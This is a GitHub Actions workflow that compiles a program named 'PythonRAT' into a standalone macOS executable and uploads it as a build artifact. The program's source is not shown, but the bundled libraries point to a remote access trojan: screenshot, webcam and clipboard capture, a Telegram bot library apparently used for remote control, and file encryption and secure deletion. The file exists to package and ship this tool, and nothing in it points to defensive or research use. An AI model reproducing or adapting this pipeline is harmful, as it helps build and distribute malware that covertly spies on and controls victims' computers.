name: Build macOS binary
on:
  workflow_dispatch:

jobs:
  build:
    runs-on: macos-13   # Intel runner; use macos-latest for Apple Silicon target
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      - name: Install dependencies
        run: |
          pip install pyinstaller numpy opencv-python-headless pyttsx3 telebot pyAesCrypt secure-delete pyperclip pillow mss

      - name: Build
        run: |
          python -m PyInstaller --onefile \
            --collect-all numpy \
            --collect-all cv2 \
            --hidden-import=mss \
            --hidden-import=pyttsx3 \
            --hidden-import=telebot \
            --hidden-import=pyAesCrypt \
            --hidden-import=secure_delete \
            --hidden-import=pyperclip \
            --hidden-import=PIL \
            --hidden-import=xml.etree.ElementTree \
            --name PythonRAT PythonRAT.py

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: PythonRAT-macos
          path: dist/PythonRAT
